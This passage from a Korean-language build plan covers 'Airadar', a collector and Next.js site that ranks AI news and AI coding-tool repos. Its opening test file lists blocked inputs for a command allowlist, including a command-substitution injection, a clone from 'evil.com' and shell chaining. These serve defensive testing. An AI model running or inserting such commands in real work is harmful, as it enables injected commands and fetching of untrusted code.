    "npm install $(whoami)",
    "git clone https://evil.com/x",
    "sudo npm install -g x",
    "npx x && echo hi",
]


@pytest.mark.parametrize("cmd", ALLOWED)
def test_allows_known_install_commands(cmd):
    assert filter_commands([cmd]) == [cmd]


@pytest.mark.parametrize("cmd", BLOCKED)
def test_blocks_dangerous_or_unknown_commands(cmd):
    assert filter_commands([cmd]) == []


def test_strips_dedupes_and_caps_at_three():
    cmds = [" uvx a ", "uvx a", "uvx b", "uvx c", "uvx d"]
    assert filter_commands(cmds) == ["uvx a", "uvx b", "uvx c"]
```

`collector/tests/test_scoring.py`:
```python
from collector.scoring import score, weekly_delta


def test_weekly_delta_none_without_old_snapshot():
    assert weekly_delta(100, None) is None
    assert weekly_delta(100, 80) == 20


def test_growth_beats_raw_popularity():
    assert score(500, 300, 1) > score(5000, 0, 1)


def test_fresh_beats_stale():
    assert score(100, 10, 1) > score(100, 10, 80)


def test_negative_delta_and_old_push_do_not_go_negative():
    assert score(0, -50, 400) == 0.0
```

- [ ] **Step 2: 실패 확인**

Run: `cd collector && uv run pytest tests/test_install_cmd.py tests/test_scoring.py -v`
Expected: FAIL (`ModuleNotFoundError`)

- [ ] **Step 3: 구현**

`collector/install_cmd.py` (허용 패턴 전체 일치만 통과. 문자 집합에 `; & | $ ` < >`가 없으므로 셸 연결·치환·리다이렉트가 막힌다):
```python
import re

_ARG = r"[\w.@/:=,'\[\]-]+"
PATTERNS = [re.compile(p) for p in (
    r"/plugin marketplace add [\w.-]+/[\w.-]+",
    r"/plugin install [\w.@-]+",
    rf"claude mcp add( {_ARG})+",
    rf"npx( -y)? {_ARG}( {_ARG})*",
    rf"uvx {_ARG}( {_ARG})*",
    r"pip install [\w.'\[\],=-]+",
    r"npm install( -g)? [\w.@/-]+",
    r"git clone https://github\.com/[\w.-]+/[\w.-]+",
)]


def filter_commands(cmds: list[str]) -> list[str]:
    result: list[str] = []
    for cmd in (c.strip() for c in cmds):
        if cmd not in result and any(p.fullmatch(cmd) for p in PATTERNS):
            result.append(cmd)
    return result[:3]
```

`collector/scoring.py`:
```python
import math


def weekly_delta(stars: int, old: int | None) -> int | None:
    return stars - old if old is not None else None


def score(stars: int, weekly_delta: int | None, days_since_push: float) -> float:
    growth = math.log1p(max(weekly_delta or 0, 0)) * 3
    popularity = math.log1p(max(stars, 0))
    freshness = max(0.0, 1 - days_since_push / 90) * 2
    return round(growth + popularity + freshness, 3)
```

- [ ] **Step 4: 통과 확인**

Run: `cd collector && uv run pytest tests/test_install_cmd.py tests/test_scoring.py -v`
Expected: 22 passed

- [ ] **Step 5: Commit**

```bash
git add collector/install_cmd.py collector/scoring.py collector/tests
git commit -m "feat: add install command allowlist and repo scoring"
```

---

### Task 5: GitHub 수집 + run_repos
**담당:** collector-dev

**Files:**
- Create: `collector/sources/github.py`, `collector/run_repos.py`
- Test: `collector/tests/test_github.py`, `collector/tests/test_run_repos.py`

**Interfaces:**
- Consumes: db 함수 (T1), `get_provider/max_calls` (T2), `filter_commands`, `score`, `weekly_delta` (T4)
- Produces: `github.parse_search(data: dict) -> list[dict]`, `github.merge(batches: list[list[dict]]) -> list[dict]`, `github.fetch() -> list[dict]`, `github.fetch_readme(full_name) -> str | None`

- [ ] **Step 1: 실패하는 테스트 작성** — `collector/tests/test_github.py`

```python
from collector.sources.github import merge, parse_search


def item(name, archived=False, stars=50):
    return {"full_name": name, "description": "d", "html_url": f"https://github.com/{name}",
            "stargazers_count": stars, "pushed_at": "2026-09-20T10:00:00Z",
            "topics": ["mcp-server"], "archived": archived}


def test_parse_search_maps_fields_and_drops_archived():
    repos = parse_search({"items": [item("a/b"), item("c/d", archived=True)]})
    assert len(repos) == 1
    r = repos[0]
    assert r["full_name"] == "a/b" and r["url"] == "https://github.com/a/b" and r["stars"] == 50
    assert r["pushed_at"].year == 2026 and r["pushed_at"].tzinfo is not None
    assert r["topics"] == ["mcp-server"]


def test_merge_dedupes_repos_found_under_multiple_topics():
    a = parse_search({"items": [item("a/b"), item("x/y")]})
    b = parse_search({"items": [item("a/b")]})
    assert [r["full_name"] for r in merge([a, b])] == ["a/b", "x/y"]
```

`collector/tests/test_run_repos.py`:
```python
import pytest

from collector import run_repos


def test_main_exits_when_nothing_fetched(monkeypatch):
    monkeypatch.setattr(run_repos.github, "fetch", lambda: [])
    with pytest.raises(SystemExit):
        run_repos.main()


def test_main_saves_repos_even_when_llm_config_is_invalid(monkeypatch):
    from contextlib import nullcontext
    from datetime import datetime, timezone

    saved = []
    repo = {"full_name": "o/r", "description": None, "url": "u", "stars": 30,
            "pushed_at": datetime.now(timezone.utc), "topics": []}
    monkeypatch.setattr(run_repos.github, "fetch", lambda: [repo])
    monkeypatch.setattr(run_repos.db, "connect", lambda: nullcontext(object()))
    monkeypatch.setattr(run_repos.db, "apply_schema", lambda conn: None)
    monkeypatch.setattr(run_repos.db, "upsert_repo", lambda conn, r: saved.append(r) or 1)
    monkeypatch.setattr(run_repos.db, "save_snapshot", lambda *a: None)
    monkeypatch.setattr(run_repos.db, "stars_days_ago", lambda *a, **k: None)
    monkeypatch.setattr(run_repos.db, "update_repo_score", lambda *a: None)
    monkeypatch.setenv("LLM_API_KEY", "k")
    monkeypatch.setenv("LLM_PROVIDER", "bogus")
    with pytest.raises(SystemExit):
        run_repos.main()
    assert saved == [repo]
```

- [ ] **Step 2: 실패 확인**

Run: `cd collector && uv run pytest tests/test_github.py tests/test_run_repos.py -v`
Expected: FAIL (`ImportError`)

- [ ] **Step 3: 구현**

`collector/sources/github.py`:
```python
import logging
import os
import time
from datetime import date, datetime, timedelta

import httpx

log = logging.getLogger("airadar.github")

API = "https://api.github.com"
TOPICS = ["claude-code", "claude-code-plugin", "claude-skills", "mcp-server",
          "model-context-protocol", "cursor-rules", "ai-agents"]


def _headers(raw: bool = False) -> dict:
    h = {"Accept": "application/vnd.github.raw" if raw else "application/vnd.github+json",
         "User-Agent": "airadar/0.1"}
    if token := os.environ.get("GITHUB_TOKEN"):
        h["Authorization"] = f"Bearer {token}"
    return h


def _dt(s: str | None) -> datetime | None:
    return datetime.fromisoformat(s.replace("Z", "+00:00")) if s else None


def parse_search(data: dict) -> list[dict]:
    return [{"full_name": r["full_name"], "description": r.get("description"), "url": r["html_url"],
             "stars": r["stargazers_count"], "pushed_at": _dt(r.get("pushed_at")),
             "topics": r.get("topics", [])}
            for r in data.get("items", []) if not r.get("archived")]


def merge(batches: list[list[dict]]) -> list[dict]:
    seen: dict[str, dict] = {}
    for batch in batches:
        for repo in batch:
            seen.setdefault(repo["full_name"], repo)
    return list(seen.values())


def fetch() -> list[dict]:
    since = date.today() - timedelta(days=90)
    delay = 2 if os.environ.get("GITHUB_TOKEN") else 7  # Search API 분당 호출 제한
    batches = []
    for i, topic in enumerate(TOPICS):
        if i:
            time.sleep(delay)
        r = httpx.get(f"{API}/search/repositories", headers=_headers(), timeout=20, params={
            "q": f"topic:{topic} stars:>=20 pushed:>={since}", "sort": "stars", "order": "desc", "per_page": 50,
        })
        if r.status_code != 200:
            log.warning("search %s failed: %s", topic, r.status_code)
            continue
        batches.append(parse_search(r.json()))
    return merge(batches)


def fetch_readme(full_name: str) -> str | None:
    r = httpx.get(f"{API}/repos/{full_name}/readme", headers=_headers(raw=True),
                  timeout=20, follow_redirects=True)
    return r.text if r.status_code == 200 else None
```

`collector/run_repos.py`:
```python
import hashlib
import logging
from datetime import datetime, timezone

from collector import db
from collector.install_cmd import filter_commands
from collector.llm.base import get_provider, max_calls
from collector.scoring import score, weekly_delta
from collector.sources import github

log = logging.getLogger("airadar.repos")

TOP_N = 50


def main() -> None:
    logging.basicConfig(level=logging.INFO)
    repos = github.fetch()
    if not repos:
        log.error("no repos fetched")
        raise SystemExit(1)
    now = datetime.now(timezone.utc)
    today = now.date()
    with db.connect() as conn:
        db.apply_schema(conn)
        for r in repos:
            rid = db.upsert_repo(conn, r)
            db.save_snapshot(conn, rid, r["stars"], today)
            delta = weekly_delta(r["stars"], db.stars_days_ago(conn, rid, today))
            days = (now - r["pushed_at"]).total_seconds() / 86400 if r["pushed_at"] else 90
            db.update_repo_score(conn, rid, score(r["stars"], delta, days), delta)
        log.info("scored %d repos", len(repos))
        # LLM 설정 오류가 있어도 레포·스냅샷은 이미 저장됐다. 요약만 건너뛰고 실패로 끝내 Actions에서 드러나게 한다
        try:
            provider = get_provider()
        except ValueError as e:
            log.error("LLM config error; skipping summaries: %s", e)
            raise SystemExit(1)
        if provider is None:
            log.info("LLM_API_KEY not set; skipping summaries")
            return
        budget = max_calls()
        for row in db.top_repos(conn, TOP_N):
            if budget <= 0:
                break
            readme = github.fetch_readme(row["full_name"])
            if readme is None:
                continue
            digest = hashlib.sha256(readme.encode()).hexdigest()
            if digest == row["readme_hash"]:
                continue
            budget -= 1
            result = provider.summarize(f"{row['full_name']}\n{row['description'] or ''}\n\n{readme}", "repo")
            if result:
                db.set_repo_llm(conn, row["id"], digest, result["category"], result["summary_ko"],
                                filter_commands(result["install_commands"]))


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: 통과 확인**

Run: `cd collector && uv run pytest -v`
Expected: 전체 passed (DB 테스트는 skip 가능)

- [ ] **Step 5: 실제 실행 확인 (DB가 있을 때)**

Run: `DATABASE_URL=<neon-branch-url> uv run --project collector python -m collector.run_repos`
Expected: `scored N repos` 로그. 키를 설정했으면 `repos.summary_ko`가 채워진다

- [ ] **Step 6: Commit**

```bash
git add collector/sources/github.py collector/run_repos.py collector/tests/test_github.py
git commit -m "feat: collect and score AI coding tool repos from GitHub"
```

---

### Task 6: Next.js 웹
**담당:** web-dev

**Files:**
- Create: `web/` (create-next-app), `web/lib/types.ts`, `web/lib/db.ts`, `web/components/{NewsList,RepoCard,RepoList,CopyButton,FilterLinks}.tsx`, `web/app/{news,tools,trending}/page.tsx`
- Modify: `web/app/layout.tsx`, `web/app/page.tsx` (생성된 파일 전체 교체)

**Interfaces:**
- Consumes: `db/schema.sql`의 `news_items`, `repos` 컬럼 (T1)
- Produces: `getNews(source?, limit=50)`, `getNewsSources()`, `getTools(category?, limit=50)`, `getTrending(limit=30)` (전부 `DATABASE_URL`이 없으면 `[]`)

- [ ] **Step 1: 스캐폴드**

```bash
npx create-next-app@latest web --ts --tailwind --eslint --app --no-src-dir --import-alias "@/*" --use-npm --yes
cd web && npm install @neondatabase/serverless
```

- [ ] **Step 2: 타입** — `web/lib/types.ts`

```ts
export type NewsItem = {
  id: number;
  source: string;
  url: string;
  title: string;
  published_at: string | null;
  excerpt: string | null;
  lang: string;
  summary_ko: string | null;
};

export type Repo = {
  id: number;
  full_name: string;
  description: string | null;
  url: string;
  category: string | null;
  stars: number;
  weekly_star_delta: number | null;
  summary_ko: string | null;
  install_commands: string[];
};

export const CATEGORY_LABELS: Record<string, string> = {
  "claude-code-plugin": "Claude Code 플러그인",
  skill: "스킬",
  "mcp-server": "MCP 서버",
  "cursor-rules": "Cursor 규칙",
  "agent-framework": "에이전트 프레임워크",
  other: "기타",
};

export const TRENDING_EMPTY = "집계 중입니다. 스타 기록이 7일 이상 쌓이면 표시됩니다.";
```

- [ ] **Step 3: 쿼리** — `web/lib/db.ts` (`id::int`는 bigint가 문자열로 오는 것을 막고, `published_at::text`는 직렬화를 단순하게 하기 위해서다)

```ts
import { neon } from "@neondatabase/serverless";
import type { NewsItem, Repo } from "./types";

const sql = process.env.DATABASE_URL ? neon(process.env.DATABASE_URL) : null;

export async function getNews(source?: string, limit = 50): Promise<NewsItem[]> {
  if (!sql) return [];
  const s = source ?? null;
  return (await sql`
    SELECT id::int, source, url, title, published_at::text, excerpt, lang, summary_ko
    FROM news_items
    WHERE ${s}::text IS NULL OR source = ${s}
    ORDER BY published_at DESC NULLS LAST
    LIMIT ${limit}`) as NewsItem[];
}

export async function getNewsSources(): Promise<string[]> {
  if (!sql) return [];
  const rows = await sql`SELECT DISTINCT source FROM news_items ORDER BY source`;
  return rows.map((r) => r.source as string);
}

export async function getTools(category?: string, limit = 50): Promise<Repo[]> {
  if (!sql) return [];
  const c = category ?? null;
  return (await sql`
    SELECT id::int, full_name, description, url, category, stars, weekly_star_delta, summary_ko, install_commands
    FROM repos
    WHERE summary_ko IS NOT NULL
      AND pushed_at >= now() - interval '90 days'
      AND (${c}::text IS NULL OR category = ${c})
    ORDER BY score DESC
    LIMIT ${limit}`) as Repo[];
}

export async function getTrending(limit = 30): Promise<Repo[]> {
  if (!sql) return [];
  return (await sql`
    SELECT id::int, full_name, description, url, category, stars, weekly_star_delta, summary_ko, install_commands
    FROM repos
    WHERE weekly_star_delta IS NOT NULL AND pushed_at >= now() - interval '90 days'
    ORDER BY weekly_star_delta DESC
    LIMIT ${limit}`) as Repo[];
}
```

- [ ] **Step 4: 컴포넌트**

`web/components/CopyButton.tsx`:
```tsx
"use client";

import { useState } from "react";

export default function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      type="button"
      className="shrink-0 rounded border px-2 py-1 text-xs"
      onClick={async () => {
        await navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 1500);
      }}
    >
      {copied ? "복사됨" : "복사"}
    </button>
  );
}
```

`web/components/NewsList.tsx`:
```tsx
import type { NewsItem } from "@/lib/types";

export default function NewsList({ items }: { items: NewsItem[] }) {
  if (items.length === 0) return <p className="text-gray-500">아직 수집된 뉴스가 없습니다.</p>;
  return (
    <ul className="space-y-4">
      {items.map((n) => (
        <li key={n.id} className="rounded border p-4">
          <a href={n.url} target="_blank" rel="noreferrer" className="font-semibold hover:underline">
            {n.title}
          </a>
          <p className="mt-1 text-xs text-gray-500">
            {n.source}
            {n.published_at && ` · ${new Date(n.published_at).toLocaleDateString("ko-KR")}`}
          </p>
          {(n.summary_ko ?? n.excerpt) && (
            <p className="mt-2 whitespace-pre-line text-sm">{n.summary_ko ?? n.excerpt}</p>
          )}
        </li>
      ))}
    </ul>
  );
}
```

`web/components/RepoCard.tsx`:
```tsx
import CopyButton from "./CopyButton";
import { CATEGORY_LABELS, type Repo } from "@/lib/types";

function formatDelta(d: number) {
  return `${d >= 0 ? "+" : ""}${d.toLocaleString()}/주`;
}

export default function RepoCard({ repo }: { repo: Repo }) {
  return (
    <li className="rounded border p-4">
      <div className="flex items-baseline justify-between gap-2">
        <a href={repo.url} target="_blank" rel="noreferrer" className="font-semibold hover:underline">
          {repo.full_name}
        </a>
        <span className="shrink-0 text-xs text-gray-500">
          ★ {repo.stars.toLocaleString()}
          {repo.weekly_star_delta !== null && ` (${formatDelta(repo.weekly_star_delta)})`}
        </span>
      </div>
      {repo.category && (
        <span className="mt-1 inline-block rounded bg-gray-100 px-2 text-xs dark:bg-gray-800">
          {CATEGORY_LABELS[repo.category] ?? repo.category}
        </span>
      )}
      {(repo.summary_ko ?? repo.description) && (
        <p className="mt-2 whitespace-pre-line text-sm">{repo.summary_ko ?? repo.description}</p>
      )}
      {repo.install_commands.length > 0 && (
        <ul className="mt-3 space-y-1">
          {repo.install_commands.map((c) => (
            <li key={c} className="flex items-center gap-2">
              <code className="flex-1 overflow-x-auto rounded bg-gray-100 px-2 py-1 text-xs dark:bg-gray-800">{c}</code>
              <CopyButton text={c} />
            </li>
          ))}
        </ul>
      )}
    </li>
  );
}
```

`web/components/RepoList.tsx`:
```tsx
import RepoCard from "./RepoCard";
import type { Repo } from "@/lib/types";

export default function RepoList({ repos, empty }: { repos: Repo[]; empty: string }) {
  if (repos.length === 0) return <p className="text-gray-500">{empty}</p>;
  return (
    <ul className="space-y-4">
      {repos.map((r) => (
        <RepoCard key={r.id} repo={r} />
      ))}
    </ul>
  );
}
```

`web/components/FilterLinks.tsx`:
```tsx
import Link from "next/link";

type Props = { base: string; param: string; options: [string, string][]; current?: string };

export default function FilterLinks({ base, param, options, current }: Props) {
  const cls = (active: boolean) =>
    `rounded px-2 py-1 ${active ? "bg-gray-900 text-white dark:bg-gray-100 dark:text-gray-900" : "border"}`;
  return (
    <nav className="mb-4 flex flex-wrap gap-2 text-sm">
      <Link href={base} className={cls(!current)}>전체</Link>
      {options.map(([value, label]) => (
        <Link key={value} href={`${base}?${param}=${encodeURIComponent(value)}`} className={cls(current === value)}>
          {label}
        </Link>
      ))}
    </nav>
  );
}
```

- [ ] **Step 5: 페이지**

`web/app/layout.tsx` (생성된 파일 교체):
```tsx
import type { Metadata } from "next";
import Link from "next/link";
import "./globals.css";

export const metadata: Metadata = { title: "Airadar", description: "AI 뉴스와 AI 코딩 도구 추천" };

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="ko">
      <body className="mx-auto max-w-4xl px-4 py-6">
        <header className="mb-8 flex items-center gap-6">
          <Link href="/" className="text-xl font-bold">Airadar</Link>
          <nav className="flex gap-4 text-sm">
            <Link href="/news">뉴스</Link>
            <Link href="/tools">도구 추천</Link>
            <Link href="/trending">급상승</Link>
          </nav>
        </header>
        {children}
      </body>
    </html>
  );
}
```

`web/app/page.tsx` (생성된 파일 교체):
```tsx
import Link from "next/link";
import NewsList from "@/components/NewsList";
import RepoList from "@/components/RepoList";
import { getNews, getTrending } from "@/lib/db";
import { TRENDING_EMPTY } from "@/lib/types";

export const revalidate = 3600;

export default async function Home() {
  const [news, trending] = await Promise.all([getNews(undefined, 5), getTrending(5)]);
  return (
    <div className="space-y-10">
      <section>
        <h2 className="mb-3 text-lg font-bold">
          최신 AI 뉴스 <Link href="/news" className="ml-2 text-sm font-normal text-blue-600">더 보기</Link>
        </h2>
        <NewsList items={news} />
      </section>
      <section>
        <h2 className="mb-3 text-lg font-bold">
          이번 주 급상승 <Link href="/trending" className="ml-2 text-sm font-normal text-blue-600">더 보기</Link>
        </h2>
        <RepoList repos={trending} empty={TRENDING_EMPTY} />
      </section>
    </div>
  );
}
```

`web/app/news/page.tsx`:
```tsx
import FilterLinks from "@/components/FilterLinks";
import NewsList from "@/components/NewsList";
import { getNews, getNewsSources } from "@/lib/db";

export const revalidate = 3600;

export default async function NewsPage({ searchParams }: { searchParams: Promise<{ source?: string }> }) {
  const { source } = await searchParams;
  const [items, sources] = await Promise.all([getNews(source), getNewsSources()]);
  return (
    <div>
      <h1 className="mb-4 text-2xl font-bold">AI 뉴스</h1>
      <FilterLinks base="/news" param="source" options={sources.map((s) => [s, s])} current={source} />
      <NewsList items={items} />
    </div>
  );
}
```

`web/app/tools/page.tsx`:
```tsx
import FilterLinks from "@/components/FilterLinks";
import RepoList from "@/components/RepoList";
import { getTools } from "@/lib/db";
import { CATEGORY_LABELS } from "@/lib/types";

export const revalidate = 3600;

export default async function ToolsPage({ searchParams }: { searchParams: Promise<{ category?: string }> }) {
  const { category } = await searchParams;
  const repos = await getTools(category);
  return (
    <div>
      <h1 className="mb-4 text-2xl font-bold">AI 코딩 도구 추천</h1>
      <FilterLinks base="/tools" param="category" options={Object.entries(CATEGORY_LABELS)} current={category} />
      <RepoList repos={repos} empty="아직 추천할 도구가 없습니다." />
    </div>
  );
}
```

`web/app/trending/page.tsx`:
```tsx
import RepoList from "@/components/RepoList";
import { getTrending } from "@/lib/db";
import { TRENDING_EMPTY } from "@/lib/types";

export const revalidate = 3600;

export default async function TrendingPage() {
  const repos = await getTrending();
  return (
    <div>
      <h1 className="mb-4 text-2xl font-bold">이번 주 급상승 레포</h1>
      <RepoList repos={repos} empty={TRENDING_EMPTY} />
    </div>
  );
}
```

- [ ] **Step 6: 빌드 확인 (DB 없이)**

Run: `cd web && npm run build`
Expected: 빌드 성공. `DATABASE_URL`이 없으므로 모든 페이지가 빈 상태로 생성된다

- [ ] **Step 7: 실제 데이터 확인 (Task 3·5를 실행한 DB가 있을 때)**

Run: `cd web && DATABASE_URL=<neon-branch-url> npm run dev` → `/`, `/news`, `/tools`, `/trending`, `/news?source=geeknews`, `/tools?category=mcp-server` 확인
Expected: 요약이 없으면 excerpt/description이 보이고, 복사 버튼이 동작하고, 트렌드는 "집계 중"이 나온다

- [ ] **Step 8: Commit**

```bash
git add web
git commit -m "feat: add Next.js pages for news, tools and trending"
```

---

### Task 7: GitHub Actions 워크플로 + 배포 문서
**담당:** collector-dev

**Files:**
- Create: `.github/workflows/collect-news.yml`, `.github/workflows/collect-repos.yml`, `README.md`

- [ ] **Step 1: 워크플로 작성**

`.github/workflows/collect-news.yml`:
```yaml
name: collect-news
on:
  schedule:
    - cron: "0 */6 * * *"
  workflow_dispatch:
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: astral-sh/setup-uv@v6
      - run: uv sync --project collector --all-extras
      - run: uv run --project collector python -m collector.run_news
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          LLM_PROVIDER: ${{ secrets.LLM_PROVIDER }}
          LLM_API_KEY: ${{ secrets.LLM_API_KEY }}
          LLM_MODEL: ${{ secrets.LLM_MODEL }}
```

`.github/workflows/collect-repos.yml`:
```yaml
name: collect-repos
on:
  schedule:
    - cron: "0 0 * * *"
  workflow_dispatch:
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: astral-sh/setup-uv@v6
      - run: uv sync --project collector --all-extras
      - run: uv run --project collector python -m collector.run_repos
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          LLM_PROVIDER: ${{ secrets.LLM_PROVIDER }}
          LLM_API_KEY: ${{ secrets.LLM_API_KEY }}
          LLM_MODEL: ${{ secrets.LLM_MODEL }}
```

- [ ] **Step 2: README 작성** — `README.md`

````markdown
# Airadar

AI 뉴스와 AI 코딩 도구(플러그인·스킬·MCP 서버) 추천을 한국어 요약과 함께 보여 주는 웹 서비스.

## 구조
GitHub Actions(수집·요약) → Neon Postgres → Next.js(Vercel)

## 로컬 실행
```bash
cd collector && uv sync --all-extras && uv run pytest
# 저장소 루트에서
DATABASE_URL=... LLM_API_KEY=... uv run --project collector python -m collector.run_news
DATABASE_URL=... uv run --project collector python -m collector.run_repos
cd web && npm install && DATABASE_URL=... npm run dev
```
PowerShell에서는 `$env:DATABASE_URL="..."`로 먼저 설정한다.

## 환경 변수
| 이름 | 설명 |
|---|---|
| `DATABASE_URL` | Neon 연결 문자열 |
| `LLM_PROVIDER` | `claude`(기본) / `gemini` / `openai` |
| `LLM_API_KEY` | 선택한 제공자의 키. 없으면 요약을 건너뛴다 |
| `LLM_MODEL` | 모델 ID. gemini/openai는 필수 |
| `LLM_MAX_CALLS` | 실행당 LLM 호출 상한 (기본 60) |

## 배포
1. Neon에서 프로젝트를 만들고 연결 문자열을 복사한다 (테이블은 수집기가 처음 실행될 때 자동 생성된다).
2. GitHub 저장소 Settings → Secrets → Actions에 `DATABASE_URL`, `LLM_API_KEY`(필요하면 `LLM_PROVIDER`, `LLM_MODEL`)를 등록한다.
3. Actions 탭에서 `collect-news`, `collect-repos`를 `Run workflow`로 한 번 실행한다.
4. Vercel에서 저장소를 가져오고 Root Directory를 `web`으로, 환경 변수 `DATABASE_URL`을 설정해 배포한다.
5. 급상승 트렌드는 스타 기록이 7일 이상 쌓인 뒤부터 표시된다.
````

- [ ] **Step 3: 검증**

Run: `cd collector && uv run pytest && cd ../web && npm run build`
Expected: 테스트와 빌드가 모두 통과한다. 워크플로는 GitHub에 push한 뒤 `workflow_dispatch`로 수동 실행해 초록색으로 끝나는지 확인한다

- [ ] **Step 4: Commit**

```bash
git add .github README.md
git commit -m "ci: schedule collectors on GitHub Actions and document deployment"
```
